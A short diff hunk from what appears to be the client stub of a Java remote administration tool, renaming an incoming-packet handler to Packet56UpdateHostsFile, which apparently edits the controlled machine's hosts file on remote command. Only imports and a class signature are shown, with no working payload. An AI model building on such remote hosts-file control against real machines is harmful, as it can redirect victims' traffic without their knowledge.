@@ -6,7 +6,7 @@ import com.redpois0n.Connection;
 import com.redpois0n.common.OperatingSystem;
 import com.redpois0n.stub.packets.outgoing.Packet39HostEditResult;
 
-public class PacketUHOST extends AbstractIncomingPacket {
+public class Packet56UpdateHostsFile extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
